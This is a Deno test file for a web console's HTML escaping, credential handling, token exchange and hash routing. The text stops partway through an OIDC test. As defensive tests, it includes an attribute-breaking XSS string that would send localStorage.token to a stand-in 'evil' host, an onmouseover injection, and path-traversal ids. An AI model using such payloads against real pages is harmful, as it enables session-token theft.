// The console's HTML escaping, and the rule that the page carries no credential.
//
// `esc` guards an XSS into the space's own origin: record-derived values (a kind name, a grant's
// `pattern` rendered as JSON inside `title="…"`) reach HTML ATTRIBUTES, so escaping `& < >` alone
// lets a value close the attribute and inject a new one. That bug was real and shipped.
//
// The console is deliberately one file with no build step, so there is no module to import. Rather
// than split it (which would trade a real architectural property for testability), the function is
// lifted out of the page source and evaluated here. The extraction fails loudly if the function is
// renamed or reshaped, which is the property that matters: this test cannot quietly stop testing
// anything.

import { assert, assertEquals } from "@std/assert";

/** Pull one top-level `function name(...) { … }` out of source text by brace balance. */
function extractFunction(source: string, name: string): string {
  const start = source.indexOf(`function ${name}(`);
  assert(start >= 0, `console no longer defines function ${name}(); update this test with it`);
  // Skip the PARAMETER LIST before looking for the body's opening brace. A default value that is
  // an object literal (`headers = {}`) otherwise reads as the body, and the extraction silently
  // returns `{}`: a test asserting on the contents of that would pass or fail for reasons having
  // nothing to do with the function.
  let paren = 0;
  let i = source.indexOf("(", start);
  for (; i < source.length; i++) {
    if (source[i] === "(") paren++;
    else if (source[i] === ")" && --paren === 0) break;
  }
  let depth = 0;
  for (let j = source.indexOf("{", i); j < source.length; j++) {
    if (source[j] === "{") depth++;
    else if (source[j] === "}" && --depth === 0) return source.slice(start, j + 1);
  }
  throw new Error(`unbalanced braces while extracting ${name}()`);
}

const html = await Deno.readTextFile(new URL("../src/ui/index.html", import.meta.url));
const esc = new Function(`${extractFunction(html, "esc")}; return esc;`)() as (s: unknown) => string;

Deno.test("console: esc escapes both quote characters, not only the markup ones", () => {
  // `"` is the one that mattered: a grant pattern is JSON, so it ALWAYS contains a double quote.
  assertEquals(esc(`a"b`), "a&quot;b");
  assertEquals(esc("a'b"), "a&#39;b");
  assertEquals(esc("<script>"), "&lt;script&gt;");
  assertEquals(esc("a&b"), "a&amp;b");
  assertEquals(esc("plain text"), "plain text");
});

Deno.test("console: a hostile value cannot break out of an attribute", () => {
  // The shape that shipped: a value ending the attribute and opening an event handler. After
  // escaping, no raw quote and no raw angle bracket survives, so there is nothing to break out of.
  const hostile = `" onerror="fetch('//evil/'+localStorage.token)" x="`;
  const escaped = esc(hostile);
  assert(!escaped.includes('"'), "no bare double quote survives");
  assert(!/[<>]/.test(escaped), "no bare angle bracket survives");
  assert(!escaped.includes("' "), "no bare single quote survives");

  // A realistic carrier: a grant pattern rendered into title="…".
  const pattern = JSON.stringify({ tag: `x" onmouseover="alert(1)` });
  assert(!esc(pattern).includes('"'));
});

Deno.test("console: esc coerces non-strings rather than throwing", () => {
  // It is called on whatever a record body holds, which is any JSON value, and a console that
  // throws while rendering shows a blank panel, not an error.
  assertEquals(esc(42), "42");
  assertEquals(esc(null), "null");
  assertEquals(esc(undefined), "undefined");
  assertEquals(esc({ a: 1 }), "[object Object]");
});

Deno.test("console: every record-derived value in the page goes through esc", () => {
  // A cheap structural check with a real failure mode behind it: the escaping bug was not that
  // `esc` was wrong everywhere, it was that ONE call site interpolated raw. Any `${…}` inside an
  // HTML attribute in a template literal must name esc.
  // Two forms are accepted, and NOT "any bare identifier": a bare `${rec.kind}` in an attribute is
  // precisely the bug, so the check must not wave through property access.
  //   - anything routed through esc(…)
  //   - a ternary whose branches are string LITERALS, which cannot carry record data whatever the
  //     condition reads
  const literalTernary = /\?\s*(["'])[^"']*\1\s*:\s*(["'])[^"']*\2\s*$/;
  const offenders: string[] = [];
  for (const m of html.matchAll(/(?:title|value|href|src|class|id)="[^"\n]*\$\{([^}]*)\}/g)) {
    const expr = m[1];
    if (!expr.includes("esc(") && !literalTernary.test(expr)) offenders.push(m[0]);
  }
  assertEquals(offenders, [], "these attribute interpolations do not escape their value");
});

Deno.test("console: the served page carries no credential", () => {
  // `GET /` is public so the console can bootstrap in `--auth required` mode, which means anything
  // baked into this page is readable by anyone who can reach the port, and a harvested operator
  // token authorizes every verb. Never inject a credential here; the console asks for one at
  // runtime and keeps it in sessionStorage.
  assert(
    !/__RADIA_[A-Z_]*TOKEN__/.test(html),
    "the page carries a token placeholder, so something on the server may substitute a credential into it",
  );
  const tokenShaped = [...html.matchAll(/\b[0-9a-f]{48}\b/g)].map((m) => m[0]);
  assertEquals(tokenShaped, [], "a credential-shaped literal is baked into the served page");
});

Deno.test("console: no event handler interpolates a credential", () => {
  // The console can now MINT a session token (the Auth tab, operator only) and offers two buttons
  // beside it. Interpolating that token into `onclick="…"` would write a live credential into the
  // DOM as executable markup, where any injection elsewhere on the page can read it back out. It is
  // held in a variable (`MINTED`) that the handlers name instead.
  //
  // This checks the credential specifically, not every handler interpolation. The three existing
  // `onclick="…('${rec.id}')"` sites carry server-assigned ULIDs and are out of scope here.
  const offenders: string[] = [];
  for (const m of html.matchAll(/\son[a-z]+="[^"\n]*\$\{([^}]*)\}/g)) {
    if (/token|credential|secret/i.test(m[1])) offenders.push(m[0]);
  }
  assertEquals(offenders, [], "an event handler attribute interpolates something token-shaped");
});

Deno.test("console: minting parses a grant list the same way the CLI does", () => {
  // `radia login human:alice --grant message:put,query` and the Auth tab's grant box must mean the
  // same thing, or the console teaches a syntax nothing else accepts.
  const parseGrants = new Function(`${extractFunction(html, "parseGrants")}; return parseGrants;`)() as (
    who: string,
    text: string,
  ) => { principal: string; kind: string; operations: string[] }[];

  assertEquals(parseGrants("human:alice", "message:put,query"), [
    { principal: "human:alice", kind: "message", operations: ["put", "query"] },
  ]);
  // Several grants, whitespace-separated. Whitespace SEPARATES grants, so it cannot also appear
  // inside one: `message:put, query` is two grants, the second of which is malformed. That is the
  // CLI's rule too (it splits argv), and matching it is the point of this test.
  assertEquals(parseGrants("human:alice", "  message:put,query   conversation:query "), [
    { principal: "human:alice", kind: "message", operations: ["put", "query"] },
    { principal: "human:alice", kind: "conversation", operations: ["query"] },
  ]);
  // Empty is legitimate: an app (the chat) may assign the session's grants itself.
  assertEquals(parseGrants("human:alice", ""), []);
  assertEquals(parseGrants("human:alice", "   "), []);

  // Malformed input throws rather than silently minting a grant on kind "" or with no operations.
  // A grant that quietly means nothing is worse than a rejected form: it looks assigned.
  for (const bad of ["message", ":put", "message:"]) {
    let threw = false;
    try { parseGrants("human:alice", bad); } catch { threw = true; }
    assert(threw, `'${bad}' should be rejected, not parsed into a grant`);
  }
});

Deno.test("console: no credential means no request, not an operator default", () => {
  // The space's open mode answers a header-less request as `human:local`, the operator. A console
  // that leaned on that held the entire control plane because nobody had typed anything: the
  // largest possible authority acquired the least visible way. The page now gates on a token in
  // EVERY mode, so the shortcut stays available to curl and is unreachable from the browser.
  assert(
    /PUBLIC_PATHS\s*=\s*new Set\(\["\/v0\/health"\]\)/.test(html),
    "the public-path allowlist is gone or widened; only /v0/health may be called unauthenticated",
  );
  // The guard must sit in `api()`, the one funnel every panel uses. A per-caller check is a check
  // somebody will forget to add to the next panel.
  const api = extractFunction(html, "api");
  assert(/AUTH_TOKEN/.test(api) && /PUBLIC_PATHS/.test(api), "api() does not gate on the token");
  assert(/return\s*\{\s*ok:\s*false,\s*status:\s*401/.test(api), "api() does not short-circuit unauthenticated calls");

  // And the gate has to actually run: a sign-in screen nothing displays is decoration.
  assert(/id="signin"/.test(html), "no sign-in panel");
  assert(/\nstart\(\);/.test(html), "the sign-in gate is never invoked at init");
});

/** The auth trio (api / exchangeDefinition / adopt) under a scripted fetch: responses are consumed
 *  in order, every request is recorded with the credential it carried. Stubs ONLY page globals.
 *  `async` is re-prefixed below because `extractFunction` matches from the `function` keyword and
 *  silently drops it, which the grep-style tests never noticed and an EVALUATING one does. */
function authHarness(script: { status: number; json?: unknown }[], opts: { def?: string; token?: string } = {}) {
  const src = `
    const mk = () => { const m = new Map(); return {
      getItem: (k) => m.has(k) ? m.get(k) : null,
      setItem: (k, v) => m.set(k, String(v)),
      removeItem: (k) => m.delete(k),
      dump: () => Object.fromEntries(m),
    }; };
    const sessionStorage = mk(), localStorage = mk();
    const calls = [];
    const fetch = async (url, opts = {}) => {
      calls.push({ url, method: opts.method || "GET", auth: (opts.headers || {})["Authorization"] || null });
      const next = script.length > 1 ? script.shift() : script[0];
      return {
        ok: next.status < 400, status: next.status,
        json: async () => next.json ?? null,
        text: async () => JSON.stringify(next.json ?? null),
        body: { cancel: async () => {} },
      };
    };
    let signInShown = null;
    const showSignIn = (r) => { signInShown = r; };
    let tokenUsed = null;
    const useToken = (t) => { tokenUsed = t; };
    const note = () => {};
    const $ = () => ({ checked: true, value: "" });
    const location = { reload: () => {} };
    const PUBLIC_PATHS = new Set(["/v0/health"]);
    let AUTH_TOKEN = opts.token ?? null, DEF_TOKEN = opts.def ?? null, OPEN_OPERATOR = false;
    let exchanging = null;
    ${extractFunction(html, "forgetDefinition")}
    ${extractFunction(html, "exchangeDefinition")}
    async ${extractFunction(html, "api")}
    async ${extractFunction(html, "adopt")}
    return {
      api, adopt, exchangeDefinition, calls,
      state: () => ({ AUTH_TOKEN, DEF_TOKEN, signInShown, tokenUsed, session: sessionStorage.dump(), local: localStorage.dump() }),
    };
  `;
  // deno-lint-ignore no-explicit-any
  return new Function("script", "opts", src)(script, opts) as any;
}

Deno.test("console: the durable half is only ever sent to the mint endpoint", async () => {
  // The property that makes a definition token safe to keep: it can only mint. The page must hold
  // that line too — a bug that attached it as the bearer for an ordinary read would quietly turn
  // the mint-only half into a credential worth stealing.
  const t = authHarness([
    { status: 401, json: { title: "token_expired" } }, // the stale run token is refused
    { status: 200, json: { runToken: "r2" } }, // the exchange
    { status: 200, json: { stats: [] } }, // the retry succeeds
  ], { def: "DEF", token: "stale" });
  const r = await t.api("GET", "/v0/ops/stats");
  assert(r.ok, JSON.stringify(r));
  const defCarried = t.calls.filter((c: { auth: string | null }) => c.auth === "Bearer DEF").map((c: { url: string }) => c.url);
  assertEquals(defCarried, ["/v0/agent-runs"], "the durable half reached something other than the mint");
  assertEquals(t.calls.map((c: { url: string }) => c.url), ["/v0/ops/stats", "/v0/agent-runs", "/v0/ops/stats"]);
  assertEquals(t.calls[2].auth, "Bearer r2", "the retry runs under the fresh run token");
});

Deno.test("console: a 401 retries ONCE through the exchange, and a second failure is itself", async () => {
  const t = authHarness([
    { status: 401, json: {} },
    { status: 200, json: { runToken: "r2" } },
    { status: 401, json: { title: "forbidden-ish" } },
  ], { def: "DEF", token: "stale" });
  const r = await t.api("GET", "/v0/ops/stats");
  assertEquals(r.status, 401, "a failure after a fresh mint is real and is returned");
  assertEquals(t.calls.filter((c: { url: string }) => c.url === "/v0/agent-runs").length, 1, "exactly one mint per request");
});

Deno.test("console: concurrent 401s share ONE exchange (the SDK's rule, ported)", async () => {
  const t = authHarness([{ status: 200, json: { runToken: "r1" } }], { def: "DEF" });
  const [a, b, c] = await Promise.all([t.exchangeDefinition(), t.exchangeDefinition(), t.exchangeDefinition()]);
  assert(a && b && c);
  assertEquals(t.calls.length, 1, "three concurrent exchanges must mint one run, not three agent_run records");
  assertEquals(t.state().AUTH_TOKEN, "r1");
});

Deno.test("console: a revoked definition is forgotten and the reason is shown", async () => {
  const t = authHarness([{ status: 401, json: { detail: "definition revoked" } }], { def: "DEF" });
  const ok = await t.exchangeDefinition();
  assert(!ok);
  const st = t.state();
  assertEquals(st.DEF_TOKEN, null, "a mint that can never work again must not retry on every poll");
  assert(String(st.signInShown).includes("definition revoked"), String(st.signInShown));
});

Deno.test("console: adopt() identifies the half by asking it to mint, and verifies before storing", async () => {
  // A definition can only mint, so 200 on the mint IS the identification; remembered means the
  // durable half lands in localStorage with the other home cleared.
  const t = authHarness([
    { status: 200, json: { runToken: "r9" } },
  ]);
  await t.adopt("DEFTOK", true);
  const st = t.state();
  assertEquals(st.local["radia.definition"], "DEFTOK");
  assertEquals(st.session["radia.token"], "r9");
  assertEquals(st.session["radia.definition"], undefined, "one home only");

  // A run token fails the mint, must verify against health BEFORE storing, and cannot be remembered.
  const t2 = authHarness([
    { status: 401, json: {} }, // not a definition
    { status: 200, json: { principal: "run:x" } }, // health accepts it
  ]);
  await t2.adopt("RUNTOK", true);
  assertEquals(t2.calls.map((c: { url: string }) => c.url), ["/v0/agent-runs", "/v0/health"]);
  assertEquals(t2.state().tokenUsed, "RUNTOK", "stored only after health verified it");

  // An unusable token is stored NOWHERE: signed-in-and-broken is the failure this ordering prevents.
  const t3 = authHarness([{ status: 401, json: {} }]);
  const ok = await t3.adopt("JUNK", false);
  assert(!ok);
  assertEquals(t3.state().tokenUsed, null);
  assertEquals(Object.keys(t3.state().session).length, 0);
});

Deno.test("console: Enter in the token box signs in", () => {
  // The box is auto-focused and holds a pasted credential, so Enter is the keystroke that follows a
  // paste. Without a handler it did nothing and the only way in was to reach for the mouse.
  const box = html.match(/<input id="signin-token"[^>]*>/s);
  assert(box, "the sign-in token input is gone");
  assert(/onkeydown=/.test(box[0]), `no key handler on the token input: ${box[0]}`);
  assert(/["']Enter["']/.test(box[0]) && /signIn\(\)/.test(box[0]), `Enter does not call signIn(): ${box[0]}`);
});

Deno.test("console: an expired token returns to sign-in, never reports 'offline'", () => {
  // `/v0/health` is public, but a PRESENTED token must still resolve, so a bad or expired one 401s
  // on the very endpoint that would otherwise prove the space is up. The console called that
  // "offline": it named the wrong thing and left no way back to the sign-in screen, so the tab was
  // dead until you cleared sessionStorage by hand. Run tokens expire in ~15 minutes, so this is how
  // a session ordinarily ends.
  const loadHealth = extractFunction(html, "loadHealth");
  assert(/status === 401/.test(loadHealth), "loadHealth does not distinguish a 401 from an unreachable space");
  assert(/showSignIn\(/.test(loadHealth), "loadHealth cannot return to the sign-in screen");

  // The sign-in screen has to be reachable from BOTH directions: page load with no token, and a
  // credential dying mid-session. One entry point, so the two cannot drift apart.
  const showSignIn = extractFunction(html, "showSignIn");
  assert(/sessionStorage\.removeItem/.test(showSignIn), "the dead credential is kept, so every poll re-enters this path");
  assert(/clearInterval\(healthTimer\)/.test(showSignIn), "the health poll keeps running against a dead token");

  // Even when the space really is unreachable, the token stays changeable: the pill is the only
  // way to reach `setToken` from that state.
  assert(/pill[^`]*offline/.test(loadHealth) && /onclick="setToken\(\)"[^`]*offline/.test(loadHealth), "the offline pill is not clickable");
});

Deno.test("console: the page's script parses", () => {
  // No build step is a real architectural property here, and this is its one cost: a stray brace
  // ships a console that is blank in every tab, and every other test in this file reads the source
  // as TEXT, so all of them keep passing. `new Function` compiles the body without running it,
  // which is the whole check.
  const blocks = [...html.matchAll(/<script>([\s\S]*?)<\/script>/g)];
  assertEquals(blocks.length, 1, "the page grew a second script block; compile that one too");
  new Function(blocks[0][1]);
});

// ---- routing: the URL is the view ----

const ulidLine = html.match(/^const ULID = .*$/m);
assert(ulidLine, "the console no longer defines a top-level ULID pattern; update this test with it");
const makeReadRoute = new Function(
  "location",
  `${ulidLine[0]}\n${extractFunction(html, "readRoute")}; return readRoute;`,
) as (loc: { hash: string }) => () => { tab: string; id: string; params: URLSearchParams };
const routeOf = (hash: string) => makeReadRoute({ hash })();

Deno.test("console: a hash names a tab and a selection, and an empty one is the overview", () => {
  assertEquals(routeOf("").tab, "overview");
  assertEquals(routeOf("#").tab, "overview");
  assertEquals(routeOf("#flows").tab, "flows");
  const r = routeOf("#records/01KZ6X7QXBSV7PS9A9WS8VT6EJ");
  assertEquals(r.tab, "records");
  assertEquals(r.id, "01KZ6X7QXBSV7PS9A9WS8VT6EJ");
});

Deno.test("console: a record id out of the URL is validated before it becomes a request", () => {
  // The id reaches an API path and a render. Anyone can type anything here, so a value that is not
  // an id is DROPPED rather than forwarded: the tab still opens, and nothing odd is fetched.
  for (const junk of ["notaulid", "../../etc/passwd", "<script>", "01KZ6X7QXBSV7PS9A9WS8VT6E", ""]) {
    assertEquals(routeOf(`#records/${junk}`).id, "", `'${junk}' was accepted as a record id`);
    assertEquals(routeOf(`#records/${junk}`).tab, "records", "a bad id must not also lose the tab");
  }
});

Deno.test("console: the Flows knobs travel in the hash, so a comparison can be sent to someone", () => {
  // Those knobs exist to be varied and compared (too fine and every flow is unique, too coarse and
  // everything is one flow). A comparison nobody can link to is a comparison nobody can check.
  const r = routeOf("#flows?granularity=kind&counts=exact&min=3");
  assertEquals(r.tab, "flows");
  assertEquals(r.params.get("granularity"), "kind");
  assertEquals(r.params.get("counts"), "exact");
  assertEquals(r.params.get("min"), "3");
  // A knob is validated where it is applied, not here; what must hold is that a query string does
  // not leak into the tab name and open the wrong view.
  assertEquals(routeOf("#graph?x=1").tab, "graph");
});

/**
 * The router, RUN rather than read. Every other check in this file reads the page as text, which
 * cannot see whether `applyRoute` wires the tab, the selection and the knobs in the right order. A
 * stub DOM is the cost of running it; the alternative is a build step, which the console exists
 * without on purpose.
 */
function newRouter(hash: string) {
  const tabs = ["overview", "records", "graph", "flows"];
  const harness = `
    ${ulidLine![0]}
    let lastWritten = "";
    const calls = [];
    const inputs = { "fl-gran": {value:"kind+agent"}, "fl-counts": {value:"bucketed"}, "fl-min": {value:"1"},
      "fl-sum": {value:""}, "fl-sort": {value:"occurrences"}, "fl-view": {value:"list"},
      "g-view": {value:"layers"}, "g-down": {checked:false} };
    const $ = (id) => inputs[id];
    const CSS = { escape: (s) => s.replace(/[^a-zA-Z0-9+_-]/g, "") };
    const buttons = ${JSON.stringify(tabs)}.map((t) => ({ dataset: { tab: t }, classList: { add(){}, remove(){} } }));
    const document = {
      querySelector: (sel) => buttons.find((b) => sel.includes('data-tab="' + b.dataset.tab + '"')) || null,
      querySelectorAll: () => [],
    };
    function selectTab(b) { calls.push("tab:" + b.dataset.tab); }
    function showDetail(id) { calls.push("detail:" + id); }
    function showGraph(id) { calls.push("graph:" + id); }
    ${extractFunction(html, "readRoute")}
    ${extractFunction(html, "navigate")}
    ${extractFunction(html, "applyRoute")}
    return { navigate, applyRoute, calls, inputs };
  `;
  return new Function("location", harness)({ hash }) as {
    navigate: (t: string, id?: string) => void;
    applyRoute: () => void;
    calls: string[];
    inputs: Record<string, { value: string; checked?: boolean }>;
  };
}

Deno.test("console: a deep link opens the tab AND restores the selection", () => {
  const id = "01KZ6X7QXBSV7PS9A9WS8VT6EJ";
  const rec = newRouter(`#records/${id}`);
  rec.applyRoute();
  assertEquals(rec.calls, ["tab:records", `detail:${id}`]);

  const graph = newRouter(`#graph/${id}`);
  graph.applyRoute();
  assertEquals(graph.calls, ["tab:graph", `graph:${id}`]);

  // An unknown tab lands somewhere real rather than on a blank page, and drops the selection with
  // it: a record id means nothing once the tab it belonged to is gone.
  const junk = newRouter(`#nosuchtab/${id}`);
  junk.applyRoute();
  assertEquals(junk.calls, ["tab:overview"]);
});

Deno.test("console: a knob from the URL is applied before the loader, and validated first", () => {
  // Order is the whole of it: entering the Flows tab runs its loader, and the loader reads these
  // inputs. Applied after, the URL would say one thing and the table show another.
  const good = newRouter("#flows?granularity=kind&counts=exact&min=4");
  good.applyRoute();
  assertEquals(good.calls, ["tab:flows"]);
  assertEquals(good.inputs["fl-gran"].value, "kind");
  assertEquals(good.inputs["fl-counts"].value, "exact");
  assertEquals(good.inputs["fl-min"].value, "4");

  // Anyone can type anything here. A value the endpoint would reject falls back to the default
  // rather than travelling on to become a 400 that reads as the space being broken.
  const bad = newRouter("#flows?granularity=bogus&counts=nope&min=-3&sort=upward&view=pie");
  bad.applyRoute();
  assertEquals(bad.inputs["fl-gran"].value, "kind+agent");
  assertEquals(bad.inputs["fl-counts"].value, "bucketed");
  assertEquals(bad.inputs["fl-min"].value, "1");
  assertEquals(bad.inputs["fl-sort"].value, "occurrences", "an unknown sort falls back rather than 400ing downstream");
  assertEquals(bad.inputs["fl-view"].value, "list");

  // The sum/sort/view trio is what makes a COST CLAIM sendable: a flame someone is looking at is
  // an assertion about where the money goes, and it has to reopen as the same picture.
  const flame = newRouter("#flows?sum=usage.cost%2Cusage.total_tokens&sort=sum&view=flame");
  flame.applyRoute();
  assertEquals(flame.inputs["fl-sum"].value, "usage.cost,usage.total_tokens");
  assertEquals(flame.inputs["fl-sort"].value, "sum");
  assertEquals(flame.inputs["fl-view"].value, "flame");
  // Absent means default, applied rather than left as whatever the last view set.
  flame.inputs["fl-view"].value = "flame";
  const plain = newRouter("#flows");
  plain.inputs["fl-view"].value = "flame";
  plain.inputs["fl-sum"].value = "usage.cost";
  plain.applyRoute();
  assertEquals(plain.inputs["fl-view"].value, "list");
  assertEquals(plain.inputs["fl-sum"].value, "");

  // The graph's direction is the same kind of knob, and it has to survive the link: "one turn" and
  // "the whole conversation around it" are different claims rendered from the same record id, so a
  // waterfall someone is sent must open as the one they were looking at.
  const down = newRouter("#graph/01KZ6X7QXBSV7PS9A9WS8VT6EJ?view=waterfall&dir=down");
  down.applyRoute();
  assertEquals(down.inputs["g-view"].value, "waterfall");
  assertEquals(down.inputs["g-down"].checked, true);

  // Absent means the default, and it must be applied rather than left as whatever the last view
  // set: a sticky checkbox would silently narrow the next graph someone opened.
  const both = newRouter("#graph/01KZ6X7QXBSV7PS9A9WS8VT6EJ?view=waterfall");
  both.inputs["g-down"].checked = true;
  both.applyRoute();
  assertEquals(both.inputs["g-down"].checked, false);

  // Same rule for the view itself, and the default is WATERFALL: a bare graph link opens on the
  // timing question, and `view=layers` is the knob a sender chooses. Sticky would show whatever
  // the last look used.
  const bare = newRouter("#graph/01KZ6X7QXBSV7PS9A9WS8VT6EJ");
  bare.inputs["g-view"].value = "layers";
  bare.applyRoute();
  assertEquals(bare.inputs["g-view"].value, "waterfall", "a bare graph link defaults to the waterfall");
  const layers = newRouter("#graph/01KZ6X7QXBSV7PS9A9WS8VT6EJ?view=layers");
  layers.applyRoute();
  assertEquals(layers.inputs["g-view"].value, "layers", "…and an explicit layers link is honoured");
});

Deno.test("console: the route is applied INSIDE the sign-in gate, never at page load", () => {
  // The old `?tab=` deep link ran unconditionally, after `start()` had already bailed to the sign-in
  // screen. Opening the Feed or Space tab starts a 1s poll, so a deep link with no token left those
  // polls running behind the overlay, every call short-circuiting to a 401 with nothing on screen to
  // say so. The route may only be applied once a credential exists.
  const start = extractFunction(html, "start");
  assert(/applyRoute\(\)/.test(start), "start() never applies the route, so a deep link does nothing");
  // The gate widened when the page learned to hold the durable half and the labeled open-mode
  // session (plan-console-auth.md): any of the three credentials is a signed-in state.
  const gate = start.indexOf("if (!AUTH_TOKEN && !DEF_TOKEN && !OPEN_OPERATOR) return showSignIn");
  assert(gate >= 0 && start.indexOf("applyRoute()") > gate, "start() applies the route before checking for a credential");
  assert(!/\napplyRoute\(\);/.test(html), "the route is applied at top level, outside the gate");

  // And the sign-in screen must leave the URL alone: that is the whole of how a view survives a
  // credential expiring, since `useToken` reloads the same URL.
  const showSignIn = extractFunction(html, "showSignIn");
  assert(!/location\.hash/.test(showSignIn), "showSignIn touches the hash, so the view is lost on re-auth");
});

Deno.test("console: navigation goes through the URL, so the address bar cannot drift from the view", () => {
  // A tab that mutates the DOM directly and leaves the hash behind is worse than no routing at all:
  // the URL then names a view the page is not showing, and sharing it sends the wrong place.
  assert(
    /#nav button"\)\.forEach\(\(b\) => b\.onclick = \(\) => navigate\(/.test(html),
    "the nav buttons no longer navigate; they apply a tab directly and the hash goes stale",
  );
  const navigate = extractFunction(html, "navigate");
  assert(/location\.hash = next/.test(navigate), "navigate() does not write the URL");
  assert(/applyRoute\(\)/.test(navigate), "navigate() writes the URL without applying it");
});

Deno.test("console: no credential is ever written into the URL", () => {
  // The hash is shareable, lands in browser history, and is visible over a shoulder. A token in it
  // would be a credential leak by design rather than by accident.
  const offenders = [...html.matchAll(/location\.hash\s*=\s*([^;\n]*)/g)]
    .map((m) => m[1])
    .filter((expr) => /token|credential|secret|MINTED/i.test(expr));
  assertEquals(offenders, [], "a credential is assigned into location.hash");
});

Deno.test("console: a network failure is an outcome, not an exception", () => {
  // `fetch` REJECTS when nothing is listening, and every caller reads `{ok, status}`. An uncaught
  // rejection left a stopped space showing the last good render, saying nothing.
  const api = extractFunction(html, "api");
  assert(/catch\s*\(e\)\s*\{[\s\S]*status:\s*0/.test(api), "api() does not turn an unreachable space into a result");
});

Deno.test("console: the flame view's geometry is the metric, and merged prefixes tell the truth", () => {
  // Width IS the claim this view makes, so the arithmetic is tested rather than eyeballed: two
  // shapes sharing a first step must merge into ONE frame whose width carries their combined
  // total, and the whole row must sum to the root. Also the two honesty notes: no paths named,
  // and paths nothing carries.
  const harness = `
    let captured = "";
    // Stub ONLY what the page genuinely defines (\$, esc, graphColor, fmtMs are page globals).
    // The first version of this harness also stubbed a \`columns()\` the page does NOT define,
    // which is how the view shipped broken under a green test: a harness that provides a missing
    // dependency is testing a page that does not exist.
    const $ = () => ({ set innerHTML(v) { captured = v; } });
    const esc = (s) => String(s);
    const graphColor = () => "#888";
    const fmtMs = (n) => n + "ms";
    let FLOWS_LAST = [];
    let FLAME_NODES = [];
    ${extractFunction(html, "fmtSum")}
    ${extractFunction(html, "renderFlowFlame")}
    return { render: (flows, paths) => { FLOWS_LAST = flows; renderFlowFlame(flows, paths); return captured; }, fmtSum };
  `;
  const { render, fmtSum } = new Function(harness)() as {
    render: (flows: unknown[], paths: string[]) => string;
    fmtSum: (n: number) => string;
  };

  const flow = (signature: string, cost: number) => ({
    signature,
    occurrences: 1,
    totalDurationMs: 5,
    exemplars: [],
    sums: { "usage.cost": { total: cost, records: 1 } },
  });
  const out = render(
    [flow("conv ⇒ call → reply", 3), flow("conv ⇒ call → tool", 1)],
    ["usage.cost"],
  );
  // One merged root frame ("conv ⇒ call"), two children.
  const widths = [...out.matchAll(/<rect[^>]*y="0"[^>]*width="([\d.]+)"/g)].map((m) => Number(m[1]));
  assertEquals(widths.length, 1, `two flows sharing a first step are ONE root frame: ${out.slice(0, 300)}`);
  const children = [...out.matchAll(/<rect[^>]*y="26"[^>]*width="([\d.]+)"/g)].map((m) => Number(m[1]));
  assertEquals(children.length, 2, "…with each flow's own tail as a child");
  // The merged frame carries the COMBINED total, and the children split 3:1.
  assert(out.includes("usage.cost: 4 (100%"), out.match(/usage\.cost[^\n<]*/)?.[0]);
  assert(children[0] > children[1] * 2.5 && children[0] < children[1] * 3.5, `widths split by metric: ${children}`);

  // The honesty notes: a flame with nothing to weigh must say WHY it is empty.
  assert(render([flow("a → b", 1)], []).includes("needs a summed body path"));
  const none = { ...flow("a → b", 0), sums: { "usage.cost": { total: 0, records: 0 } } };
  assert(render([none], ["usage.cost"]).includes("That is a fact about the data"));

  // fmtSum keeps small money readable and big counts short.
  assertEquals(fmtSum(0.00283), "0.00283");
  assertEquals(fmtSum(11006), "11.0k");
});

Deno.test("console: the Flame button is one gesture, and only PROMOTES the hint on a click", () => {
  // Reaching the flame must not require knowing the knob dance (paths, view, sort). But the
  // console defaults to NO app vocabulary, so the placeholder becomes a value only on this
  // explicit gesture, and a sum the user already typed is never overwritten.
  const harness = `
    const inputs = {
      "fl-sum": { value: "", placeholder: "usage.cost,usage.total_tokens" },
      "fl-view": { value: "list" },
      "fl-sort": { value: "occurrences" },
    };
    const $ = (id) => inputs[id];
    let routed = false;
    function routeFlows() { routed = true; }
    ${extractFunction(html, "openFlame")}
    return { inputs, openFlame, wasRouted: () => routed };
  `;
  const t = new Function(harness)() as {
    inputs: Record<string, { value: string }>;
    openFlame: () => void;
    wasRouted: () => boolean;
  };
  t.openFlame();
  assertEquals(t.inputs["fl-sum"].value, "usage.cost,usage.total_tokens", "an empty box adopts the hint");
  assertEquals(t.inputs["fl-view"].value, "flame");
  assertEquals(t.inputs["fl-sort"].value, "sum");
  assert(t.wasRouted(), "and it routes through the hash so the picture is sendable");

  t.inputs["fl-sum"].value = "my.own.metric";
  t.inputs["fl-sort"].value = "time";
  t.openFlame();
  assertEquals(t.inputs["fl-sum"].value, "my.own.metric", "a typed value is never overwritten");
  assertEquals(t.inputs["fl-sort"].value, "time", "…nor a chosen sort");
});

/** The OIDC browser flow under scripted fetch, same rules as authHarness: stub ONLY things the
 *  page itself defines. `async` re-prefixed for the same extractFunction reason. */
function oidcHarness(script: { status: number; json?: unknown }[], opts: { pendingRoute?: string } = {}) {
  const src = `
    const mk = () => { const m = new Map(); return {
      getItem: (k) => m.has(k) ? m.get(k) : null,
      setItem: (k, v) => m.set(k, String(v)),
      removeItem: (k) => m.delete(k),
      dump: () => Object.fromEntries(m),
    }; };
    const sessionStorage = mk();
    const calls = [];
    const fetch = async (url, o = {}) => {
      calls.push({ url: String(url), method: o.method || "GET", body: o.body ?? null });
      const next = script.length > 1 ? script.shift() : script[0];
      return { ok: next.status < 400, status: next.status, json: async () => next.json ?? null };
    };
    let signInShown = null;
    const showSignIn = (r) => { signInShown = r; };
    let noted = null;
    const note = (id, cls, msg) => { noted = msg; };
    let reloaded = false;
    const location = { origin: "http://c.test", pathname: "/", hash: "#feed", search: "", href: "", reload: () => { reloaded = true; } };
    let AUTH_TOKEN = null;
    let OIDC_INFO = { issuer: "http://idp.test", clientId: "console" };
    ${extractFunction(html, "randHex")}
    ${extractFunction(html, "b64urlBytes")}
    async ${extractFunction(html, "oidcStart")}
    async ${extractFunction(html, "oidcFinish")}
    return {
      oidcStart, oidcFinish, calls,
      state: () => ({ AUTH_TOKEN, signInShown, noted, reloaded, redirect: location.href, session: sessionStorage.dump() }),
    };
  `;
  // deno-lint-ignore no-explicit-any
  return new Function("script", "opts", src)(script, opts) as any;
}

Deno.test("console: oidcStart builds a compliant PKCE redirect and keeps the dance one-use", async () => {
  const t = oidcHarness([
    { status: 200, json: { authorization_endpoint: "http://idp.test/authorize", token_endpoint: "http://idp.test/token" } },
  ]);
  await t.oidcStart();
  const st = t.state();
  const u = new URL(st.redirect);
  assertEquals(u.origin + u.pathname, "http://idp.test/authorize");
  assertEquals(u.searchParams.get("response_type"), "code");
  assertEquals(u.searchParams.get("client_id"), "console");
  assertEquals(u.searchParams.get("code_challenge_method"), "S256");
  assertEquals(u.searchParams.get("redirect_uri"), "http://c.test/");
